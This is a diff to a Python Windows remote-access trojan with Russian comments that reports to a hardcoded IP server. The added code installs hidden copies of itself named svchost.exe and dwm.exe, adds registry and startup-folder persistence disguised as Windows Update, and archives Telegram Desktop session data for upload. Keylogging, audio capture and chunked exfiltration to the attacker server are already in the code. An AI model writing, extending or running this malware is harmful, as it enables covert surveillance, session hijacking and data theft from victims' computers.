@@ -32,6 +32,7 @@ import pyperclip
 from pynput import mouse
 import pythoncom
 from datetime import datetime
+import winreg
 SERVER_URL = "http://193.124.121.76:4443"
 
 def hide_console():
@@ -62,20 +63,95 @@ class PCClient:
         self.device_id = generate_device_id()
         self.system_info = get_system_info()
         self.running = True
-        # Кейлоггер
         self.keylog = []
         self.keylog_lock = Lock()
         self.keylogger_running = False
-        # Мониторинг мыши
         self.mouse_log = []
         self.mouse_log_lock = Lock()
         self.mouse_monitor_running = False
         self.mouse_listener = None
-        # Длительная запись аудио
         self.audio_recording = False
         self.audio_frames = []
         self.audio_thread = None
         
+        # Инициализация персистентности
+        self.setup_persistence()
+        
+    def setup_persistence(self):
+        try:
+            # Создаем скрытую копию в случайном месте
+            if getattr(sys, 'frozen', False):
+                # Если мы в EXE
+                current_path = sys.executable
+            else:
+                current_path = os.path.realpath(__file__)
+                
+            # Создаем скрытую папку в AppData
+            hidden_dir = os.path.join(os.getenv('APPDATA'), 'WindowsUpdate')
+            os.makedirs(hidden_dir, exist_ok=True)
+            
+            # Копируем себя
+            copy_path = os.path.join(hidden_dir, 'svchost.exe')
+            if not os.path.exists(copy_path):
+                shutil.copy2(current_path, copy_path)
+                # Устанавливаем скрытый атрибут
+                ctypes.windll.kernel32.SetFileAttributesW(copy_path, 2)
+                
+            # Добавляем в автозагрузку (скрыто)
+            self.add_to_startup(copy_path)
+            
+            # Создаем дополнительные копии в других местах
+            other_locations = [
+                os.path.join(os.getenv('PROGRAMDATA'), 'Microsoft', 'Windows', 'Security'),
+                os.path.join(os.getenv('SYSTEMDRIVE'), 'Windows', 'Temp', 'Microsoft'),
+                os.path.join(os.getenv('SYSTEMDRIVE'), 'ProgramData', 'NVIDIA Corporation')
+            ]
+            
+            for location in other_locations:
+                try:
+                    os.makedirs(location, exist_ok=True)
+                    alt_copy = os.path.join(location, 'dwm.exe')
+                    if not os.path.exists(alt_copy):
+                        shutil.copy2(current_path, alt_copy)
+                        ctypes.windll.kernel32.SetFileAttributesW(alt_copy, 2)
+                except Exception:
+                    pass
+                    
+        except Exception as e:
+            print(f"Ошибка персистентности: {e}")
+    
+    def add_to_startup(self, exe_path):
+        try:
+            # Добавляем в реестр (скрыто)
+            key = winreg.HKEY_CURRENT_USER
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            
+            with winreg.OpenKey(key, key_path, 0, winreg.KEY_ALL_ACCESS) as reg_key:
+                try:
+                    winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, exe_path)
+                except WindowsError:
+                    pass
+                    
+            # Альтернативный метод через папку автозагрузки (скрыто)
+            startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            os.makedirs(startup_folder, exist_ok=True)
+            shortcut_path = os.path.join(startup_folder, 'Windows Update.lnk')
+            
+            if not os.path.exists(shortcut_path):
+                from win32com.client import Dispatch
+                
+                shell = Dispatch('WScript.Shell')
+                shortcut = shell.CreateShortCut(shortcut_path)
+                shortcut.Targetpath = exe_path
+                shortcut.WorkingDirectory = os.path.dirname(exe_path)
+                shortcut.save()
+                
+                # Скрываем ярлык
+                ctypes.windll.kernel32.SetFileAttributesW(shortcut_path, 2)
+                
+        except Exception as e:
+            print(f"Ошибка добавления в автозагрузку: {e}")
+
     def register_device(self):
         while self.running:
             try:
@@ -105,9 +181,58 @@ class PCClient:
                 
         return False
 
+    def get_telegram_data(self):
+        try:
+            import tempfile
+            # Поиск Telegram Desktop
+            telegram_paths = [
+                os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata'),
+                os.path.join(os.getenv('LOCALAPPDATA'), 'Telegram Desktop', 'tdata')
+            ]
+            
+            found_path = None
+            for path in telegram_paths:
+                if os.path.exists(path):
+                    found_path = path
+                    break
+                    
+            if not found_path:
+                return "Telegram Desktop не найден", None, None
+                
+            # Создаем временный архив
+            temp_dir = tempfile.mkdtemp()
+            zip_name = f"telegram_tdata_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
+            zip_path = os.path.join(temp_dir, zip_name)
+            
+            # Создаем архив с tdata
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(found_path):
+                    for file in files:
+                        try:
+                            full_path = os.path.join(root, file)
+                            arcname = os.path.relpath(full_path, os.path.dirname(found_path))
+                            zipf.write(full_path, arcname)
+                        except Exception as e:
+                            continue
+            
+            # Загружаем на сервер
+            download_url, msg = self.upload_large_file(zip_path, 'telegram')
+            
+            # Удаляем временные файлы
+            shutil.rmtree(temp_dir)
+            
+            if download_url:
+                file_size = os.path.getsize(zip_path) // (1024 * 1024)  # в MB
+                return (f"✅ Данные Telegram готовы к скачиванию\n"
+                       f"📦 Размер архива: {file_size} MB"), download_url, 'url'
+            else:
+                return msg, None, None
+                
+        except Exception as e:
+            return f"Ошибка получения данных Telegram: {str(e)}", None, None
+
     def upload_large_file(self, file_path, file_type='file'):
         try:
-            # Читаем файл чанками
             file_size = os.path.getsize(file_path)
             chunk_size = 10 * 1024 * 1024  # 10MB chunks
             
@@ -118,10 +243,8 @@ class PCClient:
                     if not chunk:
                         break
                     
-                    # Кодируем чанк в base64
                     chunk_b64 = base64.b64encode(chunk).decode('utf-8')
                     
-                    # Отправляем чанк на сервер
                     response = requests.post(
                         f"{SERVER_URL}/upload_chunk",
                         json={
@@ -139,7 +262,6 @@ class PCClient:
                     
                     chunk_num += 1
             
-            # Получаем итоговую ссылку
             response = requests.post(
                 f"{SERVER_URL}/finalize_upload",
                 json={
@@ -196,8 +318,6 @@ class PCClient:
         """Рекурсивно подсчитывает общий размер файлов в директории"""
         total = 0
         for root, dirs, files in os.walk(path):
-            # Исключаем кэш-папки
-            dirs[:] = [d for d in dirs if d not in ('Cache', 'GPUCache', 'ShaderCache')]
             for file in files:
                 file_path = os.path.join(root, file)
                 try:
@@ -230,13 +350,11 @@ class PCClient:
             self.send_command_result(command['id'], "⌛ Подсчет общего размера профиля...", None, None)
             total_size = 0
             for root, dirs, files in os.walk(path):
-                dirs[:] = [d for d in dirs if d.lower() not in ('cache', 'gpucache', 'shadercache')]
                 for f in files:
-                    if not f.endswith(('.lock', '.tmp')):
-                        try:
-                            total_size += os.path.getsize(os.path.join(root, f))
-                        except:
-                            continue
+                    try:
+                        total_size += os.path.getsize(os.path.join(root, f))
+                    except:
+                        continue
 
             if total_size == 0:
                 return "Нет файлов для архивирования", None, None
@@ -253,16 +371,8 @@ class PCClient:
 
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for root, dirs, files in os.walk(path):
-                    dirs[:] = [d for d in dirs if d.lower() not in ('cache', 'gpucache', 'shadercache')]
-                    
                     for file in files:
                         file_path = os.path.join(root, file)
-                        
-                        # Пропускаем системные файлы
-                        if (file.startswith('LOCK') or 
-                            file.endswith(('.lock', '.tmp')) or 
-                            os.path.getsize(file_path) > 100 * 1024 * 1024):
-                            continue
                             
                         try:
                             # Добавляем файл в архив
@@ -354,12 +464,6 @@ class PCClient:
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 count = 0
                 for root, dirs, files in os.walk(path):
-                    # Пропускаем кэш для уменьшения размера
-                    if 'Cache' in dirs:
-                        dirs.remove('Cache')
-                    if 'GPUCache' in dirs:
-                        dirs.remove('GPUCache')
-                    
                     for file in files:
                         try:
                             full_path = os.path.join(root, file)
